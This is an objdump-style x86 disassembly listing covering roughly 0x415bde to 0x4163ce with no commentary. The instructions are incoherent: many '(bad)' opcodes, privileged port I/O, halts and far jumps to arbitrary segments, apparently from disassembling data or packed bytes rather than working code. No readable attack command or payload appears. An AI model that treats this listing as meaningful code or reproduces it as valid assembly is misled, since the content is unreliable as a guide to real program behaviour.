  415bde:	mov    BYTE PTR [edi],dh
  415be0:	inc    edx
  415be1:	push   eax
  415be2:	mov    esp,DWORD PTR [esi]
  415be4:	fbld   TBYTE PTR [ecx+eiz*8]
  415be7:	or     ah,BYTE PTR [edi-0x4b]
  415bea:	icebp  
  415beb:	or     esi,esi
  415bed:	(bad)
  415bf1:	mov    dl,0xf2
  415bf3:	test   DWORD PTR [ecx-0x45395fdc],ebx
  415bf9:	mov    BYTE PTR [edi+0x239adb93],bh
  415bff:	iret   
  415c00:	jg     0x415bb5
  415c02:	not    DWORD PTR [ebx-0x2803ff95]
  415c08:	mov    bh,0x27
  415c0a:	clc    
  415c0b:	in     al,0x9c
  415c0d:	fucomi st,st(2)
  415c0f:	sbb    eax,0x9890d28
  415c14:	dec    edi
  415c15:	add    DWORD PTR [ecx],edi
  415c17:	mov    ebx,0x7b02068e
  415c1c:	daa    
  415c1d:	dec    ecx
  415c1e:	adc    al,0x5d
  415c20:	add    eax,0xa39f29c1
  415c25:	cmp    BYTE PTR [ebx],al
  415c27:	pop    esp
  415c28:	inc    edx
  415c29:	(bad)  
  415c2a:	test   DWORD PTR [ebp+0xe],0xe5cfacc1
  415c31:	aaa    
  415c32:	hlt    
  415c33:	mov    cl,0xeb
  415c35:	xor    ah,BYTE PTR [ebp+ebp*4-0x4f]
  415c39:	mov    ch,0xd4
  415c3b:	call   0x37b6:0x981c2a17
  415c42:	pop    ebp
  415c43:	cmp    DWORD PTR [ecx],esi
  415c45:	mul    ebp
  415c47:	adc    DWORD PTR [esi],ebp
  415c49:	enter  0x22c0,0xce
  415c4d:	pushf  
  415c4e:	push   eax
  415c4f:	call   0xd6d1:0xd8f1aae
  415c56:	daa    
  415c57:	jno    0x415c6e
  415c59:	addr16 fcmovnb st,st(2)
  415c5c:	test   BYTE PTR [esi-0x3fd8dad3],al
  415c62:	je     0x415c52
  415c64:	ja     0x415c20
  415c66:	cmp    ecx,ebx
  415c68:	mov    cl,BYTE PTR [edi]
  415c6a:	call   0xf175e45
  415c6f:	mov    WORD PTR [edi-0x61],fs
  415c72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c73:	jnp    0x415c2b
  415c75:	hlt    
  415c76:	pop    ebx
  415c77:	enter  0xe622,0x48
  415c7b:	mov    bl,BYTE PTR [eax+ecx*1+0x6b97c5a6]
  415c82:	and    esi,DWORD PTR [eax+edi*1+0x34]
  415c86:	push   ds
  415c87:	jae    0x415c13
  415c89:	pop    esi
  415c8a:	push   esp
  415c8b:	das    
  415c8c:	mov    dh,0x11
  415c8e:	mov    cl,0x8e
  415c90:	rcl    DWORD PTR [edx-0x61cdab26],1
  415c96:	cli    
  415c97:	shl    ecx,cl
  415c99:	mov    cl,0x69
  415c9b:	xchg   ebp,eax
  415c9c:	ja     0x415cb4
  415c9e:	xor    bh,ch
  415ca0:	push   ecx
  415ca1:	and    eax,edi
  415ca3:	add    al,0x27
  415ca5:	and    ebp,DWORD PTR [edx-0x6f]
  415ca8:	push   0xaf89c721
  415cad:	ret    
  415cae:	nop
  415caf:	lods   al,BYTE PTR ds:[esi]
  415cb0:	shr    DWORD PTR [edx],cl
  415cb2:	pop    edi
  415cb3:	fldenv [ecx+0x19]
  415cb6:	jl     0x415c4a
  415cb8:	mov    cl,bl
  415cba:	jmp    0x415cd8
  415cbc:	outs   dx,DWORD PTR ds:[esi]
  415cbd:	and    al,0x78
  415cbf:	dec    ebp
  415cc0:	cmp    edi,DWORD PTR [edi-0x15744b99]
  415cc6:	cmp    ebp,0x32aea5ba
  415ccc:	mul    dh
  415cce:	cmp    al,0x87
  415cd0:	mov    al,ds:0xe71fb5f5
  415cd5:	call   0xf33bb1b6
  415cda:	dec    esi
  415cdb:	(bad)  
  415cdc:	pop    ds
  415cdd:	int    0x56
  415cdf:	pop    edi
  415ce0:	xor    ch,BYTE PTR [eax+eax*4]
  415ce3:	and    eax,0x87804023
  415ce8:	jp     0x415d0e
  415cea:	jae    0x415d01
  415cec:	mov    edi,0x527b4ac7
  415cf1:	jecxz  0x415cc3
  415cf3:	mov    dl,0xee
  415cf5:	std    
  415cf6:	(bad)  
  415cf7:	and    ch,BYTE PTR ds:0x4075945a
  415cfd:	and    bl,dl
  415cff:	aad    0x75
  415d01:	xor    ecx,DWORD PTR [eax+ebx*1-0x60]
  415d05:	fild   DWORD PTR [eax-0x7]
  415d08:	mov    ch,0xdb
  415d0a:	inc    edi
  415d0b:	daa    
  415d0c:	inc    edx
  415d0d:	xor    bh,0x4d
  415d10:	push   esp
  415d11:	ins    BYTE PTR es:[edi],dx
  415d12:	jns    0x415cd4
  415d14:	adc    ebx,DWORD PTR [eax]
  415d16:	jmp    0x415d09
  415d18:	add    bl,0xdf
  415d1b:	sti    
  415d1c:	jmp    0x29ab:0xabfd05d
  415d23:	or     al,0x9d
  415d25:	mov    ebx,ebx
  415d27:	clc    
  415d28:	ja     0x415d85
  415d2a:	xchg   esi,eax
  415d2b:	pop    es
  415d2c:	fadd   st,st(1)
  415d2e:	scas   al,BYTE PTR es:[edi]
  415d2f:	sbb    BYTE PTR [eax],0x56
  415d32:	inc    edx
  415d33:	bound  edx,QWORD PTR [ecx+edi*8+0x2d]
  415d37:	sub    DWORD PTR [ebp+0x619de101],eax
  415d3d:	nop
  415d3e:	(bad)  
  415d3f:	lea    eax,[edi-0x1f]
  415d42:	push   cs
  415d43:	jo     0x415cf8
  415d45:	push   ebp
  415d46:	pop    eax
  415d47:	outs   dx,BYTE PTR ds:[esi]
  415d48:	cli    
  415d49:	mov    eax,ds:0x2727003b
  415d4e:	pop    ebp
  415d4f:	add    dh,BYTE PTR [ebp+ecx*4+0x65]
  415d53:	dec    edx
  415d54:	inc    edi
  415d55:	rol    dl,cl
  415d57:	push   DWORD PTR [ecx]
  415d59:	inc    ch
  415d5b:	iret   
  415d5c:	jl     0x415cf6
  415d5e:	jmp    0xa90b:0xb32a9203
  415d65:	sahf   
  415d66:	xchg   ebp,eax
  415d67:	daa    
  415d68:	pop    ds
  415d69:	sbb    al,0xfb
  415d6b:	clc    
  415d6c:	inc    ebp
  415d6d:	shl    ebp,cl
  415d6f:	xor    ebp,DWORD PTR [eax]
  415d71:	add    al,0x7a
  415d73:	adc    ch,BYTE PTR [edx-0x6b]
  415d76:	dec    esi
  415d77:	jno    0x415d6f
  415d79:	fistp  DWORD PTR [edi]
  415d7b:	scas   al,BYTE PTR es:[edi]
  415d7c:	test   al,0xb3
  415d7e:	mov    ah,0x68
  415d80:	xor    ah,ch
  415d82:	lds    ebp,FWORD PTR [ecx+0x57]
  415d85:	inc    ecx
  415d86:	mov    al,0x84
  415d88:	lods   eax,DWORD PTR ds:[esi]
  415d89:	test   eax,0x9a098bc8
  415d8e:	data16 shr ch,1
  415d91:	mov    esp,0x6e36c99a
  415d96:	imul   esp,DWORD PTR [ecx-0x3a],0x6a4cdb8c
  415d9d:	jl     0x415d4c
  415d9f:	pop    ecx
  415da0:	imul   ebp,DWORD PTR [esi],0x2ea31aa7
  415da6:	cdq    
  415da7:	mov    dh,0x8a
  415da9:	inc    eax
  415daa:	adc    BYTE PTR [esi],0xed
  415dad:	mov    al,ds:0x393b6be2
  415db2:	cmp    ecx,edi
  415db4:	fidiv  DWORD PTR [eax+0x34]
  415db7:	jg     0x415e25
  415db9:	fnclex 
  415dbb:	cld    
  415dbc:	sti    
  415dbd:	pop    si
  415dbf:	dec    ecx
  415dc0:	pop    edi
  415dc1:	jmp    0x207a:0x3651c6ca
  415dc8:	test   eax,0x8a726bc
  415dcd:	dec    edi
  415dce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415dcf:	add    DWORD PTR ds:[eax+0x167bdefe],ebx
  415dd6:	push   edx
  415dd7:	and    ecx,DWORD PTR [ecx+esi*1]
  415dda:	clc    
  415ddb:	sbb    edx,edi
  415ddd:	aam    0x58
  415ddf:	pusha  
  415de0:	xchg   BYTE PTR ss:[ecx+eiz*4-0x8],ah
  415de5:	shl    DWORD PTR [esi+0x322f0465],1
  415deb:	mov    al,0x1e
  415ded:	sub    al,0xb9
  415def:	shr    BYTE PTR [edi+0x11dcc7c5],0xe4
  415df6:	dec    ecx
  415df7:	jge    0x415e32
  415df9:	sti    
  415dfa:	xor    eax,0xa3da73df
  415dff:	pop    ebx
  415e00:	stc    
  415e01:	dec    edx
  415e02:	loopne 0x415e4a
  415e04:	mov    esi,0xb2aa5562
  415e09:	call   DWORD PTR [esi-0x6a674ff]
  415e0f:	aaa    
  415e10:	call   0x15dc:0x3d6b7207
  415e17:	and    ecx,DWORD PTR [ebx]
  415e19:	movhlps xmm5,xmm6
  415e1c:	lds    ax,DWORD PTR cs:[edi-0x7b]
  415e21:	(bad)  
  415e22:	leave  
  415e23:	jp     0x415e8d
  415e25:	sub    DWORD PTR [ecx],edi
  415e27:	mov    ?,WORD PTR [eax+0x6627cd77]
  415e2d:	mov    bh,0xd6
  415e2f:	lods   eax,DWORD PTR ds:[esi]
  415e30:	in     eax,dx
  415e31:	push   ss
  415e32:	adc    eax,0xfb5705cd
  415e37:	jmp    0x9a56:0x9cfde5d2
  415e3e:	bound  esi,QWORD PTR [ebp+0x79]
  415e41:	jne    0x415e19
  415e43:	dec    edx
  415e44:	test   al,0xa0
  415e46:	pop    esi
  415e47:	icebp  
  415e48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e49:	iret   
  415e4a:	hlt    
  415e4b:	fdiv   QWORD PTR [eax]
  415e4d:	arpl   WORD PTR [ebp+esi*2+0x4d],dx
  415e51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e52:	enter  0x873e,0xc4
  415e56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e57:	call   0xe087f3a4
  415e5c:	dec    esp
  415e5d:	xchg   edi,eax
  415e5e:	mov    dl,0xfe
  415e60:	jmp    0x9977015d
  415e65:	(bad)  
  415e66:	push   ebx
  415e67:	push   ss
  415e68:	push   ss
  415e69:	lock inc ebp
  415e6b:	lods   eax,DWORD PTR ds:[esi]
  415e6c:	push   esp
  415e6d:	mov    ebp,0x96003df1
  415e72:	nop
  415e73:	stc    
  415e74:	imul   eax,DWORD PTR [ebx-0x5a],0x45
  415e78:	or     bl,BYTE PTR [edi]
  415e7a:	push   ss
  415e7b:	sub    ah,dh
  415e7d:	test   edi,esi
  415e7f:	pop    ds
  415e80:	mov    eax,0x86b512ce
  415e85:	and    ebp,DWORD PTR [ebx-0x59]
  415e88:	ror    DWORD PTR [ecx-0x6981f42c],0x78
  415e8f:	mov    edx,eax
  415e91:	ficomp WORD PTR [ecx]
  415e93:	jge    0x415f08
  415e95:	enter  0x875,0xc9
  415e99:	xchg   BYTE PTR [edx+ecx*8+0x6f571d4b],cl
  415ea0:	mov    esi,0x326d8b62
  415ea5:	into   
  415ea6:	in     eax,dx
  415ea7:	ret    
  415ea8:	cmp    DWORD PTR [esi+eax*8],edx
  415eab:	pop    ebp
  415eac:	in     eax,dx
  415ead:	gs mov ss,ebx
  415eb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415eb1:	imul   ecx,DWORD PTR [eax+edx*4+0x61770eaa],0xffffffbe
  415eb9:	mov    al,ds:0x2bc54bdc
  415ebe:	push   0xbc88f72e
  415ec3:	in     al,dx
  415ec4:	push   ebp
  415ec5:	mov    ebp,0x7eb70302
  415eca:	pop    ebp
  415ecb:	mov    WORD PTR [esi],ss
  415ecd:	push   cs
  415ece:	adc    BYTE PTR [edx+ebp*1+0x54af7f6f],dl
  415ed5:	imul   ebp,DWORD PTR [esi],0xffffffd2
  415ed8:	clc    
  415ed9:	cmp    eax,0x84367f3
  415ede:	mov    eax,0x549ea2bd
  415ee3:	xchg   edi,ecx
  415ee5:	and    al,BYTE PTR [ecx+edx*2]
  415ee8:	retf   
  415ee9:	dec    edi
  415eea:	jno    0x415f5c
  415eec:	mov    ds:0x7acd6383,eax
  415ef1:	fwait
  415ef2:	mov    ecx,0xbd410f78
  415ef7:	push   edi
  415ef8:	cmp    DWORD PTR [edi],edi
  415efa:	inc    ebp
  415efb:	xor    eax,0x9e54940d
  415f00:	inc    eax
  415f01:	xor    DWORD PTR [ecx+0x14],edi
  415f04:	add    ecx,ebp
  415f06:	sbb    ebp,DWORD PTR [eax]
  415f08:	lahf   
  415f09:	xchg   ebp,eax
  415f0a:	pusha  
  415f0b:	dec    edi
  415f0c:	daa    
  415f0d:	dec    edx
  415f0e:	je     0x415f81
  415f10:	ss inc esp
  415f12:	pop    ss
  415f13:	jl     0x415eb1
  415f15:	lds    ebx,FWORD PTR [edx+eax*2+0x57c40a81]
  415f1c:	int    0x5c
  415f1e:	ret    0xadbe
  415f21:	push   ebx
  415f22:	add    dh,BYTE PTR [ecx-0x15753b99]
  415f28:	repnz sbb BYTE PTR [eax-0x63a8c9f],dh
  415f2f:	outs   dx,BYTE PTR ds:[esi]
  415f30:	adc    DWORD PTR [edi+0x65],edi
  415f33:	out    dx,eax
  415f34:	push   ss
  415f35:	push   edx
  415f36:	mov    ebp,0x9d0890e6
  415f3b:	jns    0x415eed
  415f3d:	sub    eax,0x40b2d26d
  415f42:	std    
  415f43:	pop    ss
  415f44:	(bad)  
  415f45:	dec    ebx
  415f46:	jp     0x415f0a
  415f48:	sbb    ch,BYTE PTR [ebx+0x70]
  415f4b:	jne    0x415f36
  415f4d:	add    DWORD PTR [edx+0x30],esi
  415f50:	outs   dx,DWORD PTR ds:[esi]
  415f51:	add    DWORD PTR [ebx],0xedae714f
  415f57:	ins    BYTE PTR es:[edi],dx
  415f58:	mov    ebp,0x6d95db86
  415f5d:	outs   dx,DWORD PTR ds:[esi]
  415f5e:	and    bh,cl
  415f60:	jnp    0x415f0c
  415f62:	out    dx,eax
  415f63:	pop    ss
  415f64:	pop    edi
  415f65:	jmp    0x415fac
  415f67:	mov    dl,0x41
  415f69:	xlat   BYTE PTR ds:[ebx]
  415f6a:	in     al,0xf1
  415f6c:	lea    edi,[eax]
  415f6e:	int3   
  415f6f:	hlt    
  415f70:	not    BYTE PTR [edi+edi*8-0x45]
  415f74:	ss mov ebx,0xee1d2476
  415f7a:	push   ebp
  415f7b:	lods   eax,DWORD PTR ds:[esi]
  415f7c:	mov    ebx,0x4fd93f6a
  415f81:	repz setb BYTE PTR [ebx]
  415f85:	jle    0x415f07
  415f87:	imul   edx,DWORD PTR [esi+edx*1-0x9bd870f],0xb6de5152
  415f92:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  415f94:	inc    ebp
  415f95:	ds ret 0x5c13
  415f99:	cmp    DWORD PTR ds:0xaadd0eb0,esi
  415f9f:	shl    DWORD PTR [ebx-0x49aa381d],0xc1
  415fa6:	mov    bh,0x1c
  415fa8:	pop    ebp
  415fa9:	mov    WORD PTR [ebx+edi*2],ss
  415fac:	pop    ebp
  415fad:	aad    0xca
  415faf:	in     al,dx
  415fb0:	inc    ebp
  415fb1:	out    0xd7,eax
  415fb3:	sub    esp,DWORD PTR [eax+0x77b239f1]
  415fb9:	dec    esi
  415fba:	call   0x67f0fa5a
  415fbf:	pop    eax
  415fc0:	es xchg edi,eax
  415fc2:	(bad)  
  415fc3:	adc    eax,0xe2e718a5
  415fc8:	or     eax,0xa226f170
  415fcd:	test   eax,0x2ebc3491
  415fd2:	xchg   BYTE PTR [ebx+0x175f6ff7],bh
  415fd8:	inc    ebp
  415fd9:	push   0x3c321710
  415fde:	sbb    dh,dh
  415fe0:	fwait
  415fe1:	jo     0x416050
  415fe3:	sti    
  415fe4:	arpl   dx,si
  415fe6:	mov    edi,0xb2dc8b68
  415feb:	jge    0x41606c
  415fed:	test   BYTE PTR [ebx+0x164cdc8],ch
  415ff3:	inc    esi
  415ff4:	dec    edi
  415ff5:	js     0x415fc1
  415ff7:	cld    
  415ff8:	fstp   DWORD PTR [ebx]
  415ffa:	or     al,0x56
  415ffc:	in     al,0x7c
  415ffe:	jns    0x416046
  416000:	mov    edx,0x14efcfc1
  416005:	nop
  416006:	cmc    
  416007:	mov    al,ds:0x726e1b3c
  41600c:	jl     0x415f92
  41600e:	jns    0x416050
  416010:	gs mov ebx,0x34f30328
  416016:	inc    esi
  416017:	push   0xb7f08304
  41601c:	pop    eax
  41601d:	pop    ebp
  41601e:	mov    dl,0x6a
  416020:	push   0x4349b00d
  416025:	pop    ds
  416026:	test   al,0x32
  416028:	sbb    eax,0xd01ce7d1
  41602d:	mov    edi,0xc94309e6
  416032:	sub    ah,BYTE PTR [esi+0x676fd525]
  416038:	pop    ebp
  416039:	out    dx,al
  41603a:	daa    
  41603b:	setg   BYTE PTR [ebp-0x6f]
  41603f:	inc    edx
  416040:	mov    BYTE PTR [ecx-0x757f164e],0x4d
  416047:	into   
  416048:	cmp    eax,0xd72fe4a5
  41604d:	jae    0x416085
  41604f:	ins    BYTE PTR es:[edi],dx
  416050:	test   al,0xc1
  416052:	aas    
  416053:	imul   esi,DWORD PTR [ecx-0x3970ec11],0xffffffe0
  41605a:	imul   edi,DWORD PTR [edx],0x6e
  41605d:	mov    DWORD PTR [edx],esi
  41605f:	jnp    0x4160cf
  416061:	dec    eax
  416062:	dec    edx
  416063:	dec    ebp
  416064:	mov    eax,ds:0x4a20a90d
  416069:	sbb    eax,DWORD PTR [edx]
  41606b:	mov    ah,0x6
  41606d:	lods   al,BYTE PTR ds:[esi]
  41606e:	(bad)  
  416070:	test   BYTE PTR [edx-0x325d2e91],0x84
  416077:	and    edi,DWORD PTR [ecx]
  416079:	mov    bl,0xc8
  41607b:	aas    
  41607c:	mov    ecx,0x39500931
  416081:	pop    esi
  416082:	popa   
  416083:	hlt    
  416084:	and    ecx,esi
  416086:	or     eax,0x123b6a85
  41608b:	sub    eax,0x78745cdb
  416090:	mov    al,0x5e
  416092:	jmp    0x2a61:0xe2d1a0dd
  416099:	xchg   ecx,eax
  41609a:	cmc    
  41609b:	imul   eax,DWORD PTR [eax+ebx*4],0xffffffcf
  41609f:	pop    esi
  4160a0:	push   ebx
  4160a1:	fiadd  DWORD PTR [eax-0x43ee519]
  4160a7:	lock pop es
  4160a9:	pop    eax
  4160aa:	xor    DWORD PTR [edx-0x62a4a593],edi
  4160b0:	jno    0x4160ba
  4160b2:	cld    
  4160b3:	popf   
  4160b4:	cdq    
  4160b5:	in     al,0xc4
  4160b7:	scas   eax,DWORD PTR es:[edi]
  4160b8:	add    BYTE PTR [ecx+ecx*4+0x63],bh
  4160bc:	and    DWORD PTR [esi],edi
  4160be:	jp     0x416068
  4160c0:	shl    BYTE PTR [ecx],cl
  4160c2:	das    
  4160c3:	mov    al,0x4c
  4160c5:	xlat   BYTE PTR ds:[ebx]
  4160c6:	fs ss fcmovnbe st,st(1)
  4160ca:	sub    dl,BYTE PTR [esi-0x2e551021]
  4160d0:	inc    ebx
  4160d1:	inc    edx
  4160d2:	pop    edi
  4160d3:	push   edx
  4160d4:	and    edx,DWORD PTR [ebx+ebp*8-0x28]
  4160d8:	les    ebx,FWORD PTR [eax]
  4160da:	imul   DWORD PTR [edx]
  4160dc:	mov    esp,0x2ddcdbae
  4160e1:	xchg   esi,eax
  4160e2:	addr16 sti 
  4160e4:	add    DWORD PTR [esi-0x69],ebp
  4160e7:	xor    eax,0xeb99dba6
  4160ec:	jb     0x41610a
  4160ee:	in     ax,dx
  4160f0:	lea    ebx,[edx-0x2b67a074]
  4160f6:	jno    0x41612d
  4160f8:	and    eax,0x9c54c34
  4160fd:	stos   DWORD PTR es:[edi],eax
  4160fe:	pusha  
  4160ff:	pop    ecx
  416100:	enter  0x87b4,0x4
  416104:	int3   
  416105:	test   eax,0x59ddcb68
  41610a:	jl     0x4160cf
  41610c:	jne    0x416126
  41610e:	lods   al,BYTE PTR ds:[esi]
  41610f:	ins    DWORD PTR es:[edi],dx
  416110:	push   edx
  416111:	sub    esp,ebp
  416113:	add    ah,dl
  416115:	(bad)  
  416116:	in     al,dx
  416117:	fdivr  DWORD PTR [esi+0xc]
  41611a:	sub    bl,BYTE PTR gs:[ecx+esi*2+0x76]
  41611f:	ins    DWORD PTR es:[edi],dx
  416120:	or     BYTE PTR [ebp-0x4d2a7248],bh
  416126:	jle    0x416170
  416128:	sub    edi,DWORD PTR [ebx]
  41612a:	lods   al,BYTE PTR ds:[esi]
  41612b:	mov    ecx,0xc6d06f9b
  416130:	push   es
  416131:	stc    
  416132:	inc    edi
  416133:	test   DWORD PTR [ecx-0x2863da49],esi
  416139:	(bad)  
  41613a:	or     DWORD PTR [eax+0x7415b5cc],esi
  416140:	dec    esp
  416141:	and    ah,BYTE PTR [eax-0x19]
  416144:	dec    eax
  416145:	mov    cl,0xb0
  416147:	jmp    0x41618b
  416149:	push   0x6522b4a4
  41614e:	fmul   st(4),st
  416150:	adc    dl,bl
  416152:	jge    0x4161d0
  416154:	xor    al,0x17
  416156:	jg     0x41616a
  416158:	shl    DWORD PTR [ecx*2+0x30cba07b],1
  41615f:	mov    edx,DWORD PTR [esi]
  416161:	dec    ecx
  416162:	xchg   esp,eax
  416163:	cmp    al,0x18
  416165:	lods   al,BYTE PTR gs:[esi]
  416167:	in     eax,0xc7
  416169:	inc    ecx
  41616a:	fs iret 
  41616c:	(bad)  
  41616d:	test   al,0x4d
  41616f:	cmp    BYTE PTR [ebx+0x759ed415],dl
  416175:	ret    0x5e91
  416178:	fisttp DWORD PTR [edi-0x10]
  41617b:	pop    esi
  41617c:	sub    eax,0xe1488f77
  416181:	or     BYTE PTR [eax-0x2275de14],cl
  416187:	test   ebx,ecx
  416189:	test   al,0x28
  41618b:	jno    0x4161a5
  41618d:	ret    
  41618e:	pusha  
  41618f:	out    0x91,al
  416191:	mov    dl,0xf6
  416193:	std    
  416194:	fwait
  416195:	loop   0x4161fd
  416197:	jmp    DWORD PTR [ebx-0x1c]
  41619a:	cld    
  41619b:	leave  
  41619c:	xchg   ebx,eax
  41619d:	pop    esp
  41619e:	mov    eax,ds:0xee48af25
  4161a3:	in     eax,dx
  4161a4:	iret   
  4161a5:	adc    al,0xcf
  4161a7:	dec    ebx
  4161a8:	popf   
  4161a9:	mov    edx,0xa27d01ff
  4161ae:	mov    dh,0xd9
  4161b0:	adc    eax,DWORD PTR [edi-0x2796f24]
  4161b6:	int3   
  4161b7:	xor    eax,0xf646b076
  4161bc:	sbb    bh,BYTE PTR [edx]
  4161be:	cwde   
  4161bf:	mov    al,0x5a
  4161c1:	cmp    al,0xec
  4161c3:	lock fldcw WORD PTR [edi+0x750d9713]
  4161ca:	jmp    0x1c77:0x945fee3a
  4161d1:	mov    edx,0xc4c65bee
  4161d6:	retf   
  4161d7:	sbb    al,cl
  4161d9:	jne    0x416228
  4161db:	xchg   edx,eax
  4161dc:	sbb    dl,BYTE PTR [ebp-0x4a]
  4161df:	mov    ah,0x42
  4161e1:	or     cl,BYTE PTR [edi+0x68a18d60]
  4161e7:	ds push edi
  4161e9:	add    ebp,0xfffffff9
  4161ec:	adc    eax,0x50e6918c
  4161f1:	and    bl,cl
  4161f3:	mov    edi,0x15c33767
  4161f8:	add    al,al
  4161fa:	and    edi,DWORD PTR [ebx+0x317e7b46]
  416200:	loop   0x416248
  416202:	out    0x65,al
  416204:	xchg   edx,eax
  416205:	lods   al,BYTE PTR ds:[esi]
  416206:	in     al,dx
  416207:	sbb    al,0xea
  416209:	test   BYTE PTR [edi-0x311fb782],0x7d
  416210:	cmp    DWORD PTR [edx],ebx
  416212:	pop    ebp
  416213:	in     al,dx
  416214:	fnsave [edi-0x6d]
  416217:	cwde   
  416218:	mov    ecx,0xa4b50d7e
  41621d:	xchg   ebx,eax
  41621e:	shl    DWORD PTR [edx-0x30],0x1f
  416222:	dec    ebp
  416223:	test   DWORD PTR [edi+0x29],ebx
  416226:	jecxz  0x41623e
  416228:	jnp    0x4161ba
  41622a:	cmp    edx,DWORD PTR [edx+0x17d56ecf]
  416230:	arpl   WORD PTR [ecx],bp
  416232:	pop    ebp
  416233:	fwait
  416234:	int    0x5a
  416236:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416237:	jo     0x4162a7
  416239:	cdq    
  41623a:	int3   
  41623b:	shr    BYTE PTR [eax],cl
  41623d:	aam    0x98
  41623f:	lahf   
  416240:	arpl   WORD PTR [ecx-0x26],si
  416243:	or     eax,0x7ba5f335
  416248:	jns    0x416224
  41624a:	mov    esi,0x3e98db60
  41624f:	mov    ds:0x4a5f630a,al
  416254:	fcmovb st,st(0)
  416256:	lock mov ebx,0xe3a9aad8
  41625c:	mov    dh,0x64
  41625e:	fwait
  41625f:	xor    esp,ebx
  416261:	aam    0x9c
  416263:	dec    esi
  416264:	add    eax,0x627bd06
  416269:	add    BYTE PTR [esi+esi*2+0x6c03dc29],bh
  416270:	jmp    0x87096660
  416275:	sbb    BYTE PTR [ebp+0x54],0x36
  416279:	(bad)  
  41627b:	or     DWORD PTR [ebp+ebp*4+0x59],edi
  41627f:	mov    edi,0xd50c9e76
  416284:	rcr    BYTE PTR [edi],0x66
  416287:	in     eax,0xb2
  416289:	jmp    0x7d4521f3
  41628e:	mov    eax,0x6ecc2ed4
  416293:	xchg   DWORD PTR [ebx+0x5ccae3a1],edx
  416299:	dec    ebp
  41629a:	or     BYTE PTR [ebp-0x2],al
  41629d:	daa    
  41629e:	inc    eax
  41629f:	xchg   edi,eax
  4162a0:	mov    bh,0x91
  4162a2:	adc    eax,0x6f8bce44
  4162a7:	aam    0x4
  4162a9:	pushf  
  4162aa:	test   DWORD PTR [ebp-0x7],ebp
  4162ad:	lods   eax,DWORD PTR ds:[esi]
  4162ae:	xchg   ebp,eax
  4162af:	shr    DWORD PTR [eax+0x36],cl
  4162b2:	shl    DWORD PTR [esi-0x53],1
  4162b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4162b6:	lds    esi,FWORD PTR [ebx+0x415ccf05]
  4162bc:	pop    es
  4162bd:	mov    ds:0xef3421,eax
  4162c2:	and    BYTE PTR [ebx],0xf7
  4162c5:	push   0xffffffab
  4162c7:	sub    BYTE PTR [eax],0xc1
  4162ca:	mov    ch,0x9
  4162cc:	cdq    
  4162cd:	aaa    
  4162ce:	retf   
  4162cf:	mov    ah,0xa
  4162d1:	gs aaa 
  4162d3:	jecxz  0x41630c
  4162d5:	sti    
  4162d6:	adc    edi,DWORD PTR [edx-0x6d9af853]
  4162dc:	mov    esi,0xe44ce197
  4162e1:	pop    es
  4162e2:	repnz in al,0xc5
  4162e5:	inc    eax
  4162e6:	stc    
  4162e7:	ins    DWORD PTR es:[edi],dx
  4162e8:	pop    esi
  4162e9:	push   ebx
  4162ea:	xor    eax,0xc09cbc08
  4162ef:	add    eax,0x1f087bde
  4162f4:	popa   
  4162f5:	push   0xba362493
  4162fa:	and    esp,DWORD PTR [eax]
  4162fc:	push   ecx
  4162fd:	retf   
  4162fe:	pop    es
  4162ff:	push   ebp
  416300:	js     0x416295
  416302:	cwde   
  416303:	ins    DWORD PTR es:[edi],dx
  416304:	clc    
  416305:	inc    DWORD PTR [ebx]
  416307:	arpl   WORD PTR [edx+0x43],ax
  41630a:	jle    0x416299
  41630c:	call   0x9d750454
  416311:	ror    ch,1
  416313:	out    dx,eax
  416314:	ret    
  416315:	xchg   edx,eax
  416316:	jo     0x4162ce
  416318:	gs jo  0x416331
  41631b:	test   al,0x9d
  41631d:	xor    eax,0x9056ac8a
  416322:	cmc    
  416323:	sar    DWORD PTR [edi],0x52
  416326:	lahf   
  416327:	xor    BYTE PTR [esi-0x68],dl
  41632a:	xor    BYTE PTR [ebp+0x2b],dl
  41632d:	(bad)  
  41632e:	sti    
  41632f:	jmp    0x416338
  416331:	fnstenv [ebx-0x6626e41]
  416337:	xchg   esi,eax
  416338:	or     al,0xab
  41633a:	jecxz  0x41632c
  41633c:	xor    esp,DWORD PTR [ebx-0x4f]
  41633f:	xchg   edi,eax
  416340:	and    eax,0xe7ff711e
  416345:	std    
  416346:	ins    BYTE PTR es:[edi],dx
  416347:	lds    esi,FWORD PTR [esi+ebp*1+0x4a3f72b6]
  41634e:	xchg   DWORD PTR [ebp+0x683f50c5],edx
  416354:	push   ebx
  416355:	mov    BYTE PTR [ebp+0x5e851224],cl
  41635b:	aad    0x7e
  41635d:	cmp    esp,0xffffff98
  416360:	mov    DWORD PTR [ecx+0x74],eax
  416363:	(bad)
  416367:	cwde   
  416368:	jae    0x41631c
  41636a:	daa    
  41636b:	icebp  
  41636c:	mov    edi,0x6e625b1e
  416371:	hlt    
  416372:	ret    
  416373:	mov    esi,0x7e46ec4a
  416378:	nop
  416379:	retf   
  41637a:	das    
  41637b:	ret    0xfe6d
  41637e:	ins    DWORD PTR es:[edi],dx
  41637f:	mov    eax,0xc70eb56f
  416384:	(bad)  
  416385:	(bad)  
  416387:	hlt    
  416388:	cmp    dl,BYTE PTR [edx-0x49]
  41638b:	repz pop ebp
  41638d:	in     eax,dx
  41638e:	hlt    
  41638f:	and    dh,dl
  416391:	mov    bh,0x19
  416393:	cmp    dh,BYTE PTR [edi]
  416395:	mov    ecx,0xd8942688
  41639a:	cmp    esi,DWORD PTR [ecx-0x374abdc2]
  4163a0:	and    DWORD PTR [ebx+ebx*2],ebx
  4163a3:	mov    bh,0x1d
  4163a5:	sbb    dh,BYTE PTR [edi-0x60246e20]
  4163ab:	ss test eax,0x608a5a78
  4163b1:	icebp  
  4163b2:	jmp    0xc1e5aff6
  4163b7:	mov    ss,esi
  4163b9:	cmp    eax,0x43dc5cf5
  4163be:	out    dx,al
  4163bf:	sbb    DWORD PTR [edx+0x13],0x6
  4163c3:	push   ebx
  4163c4:	aad    0xdd
  4163c6:	sbb    esp,eax
  4163c8:	fnstenv [esi+0x75b01e18]
  4163ce:	scas   eax,DWORD PTR es:[edi]
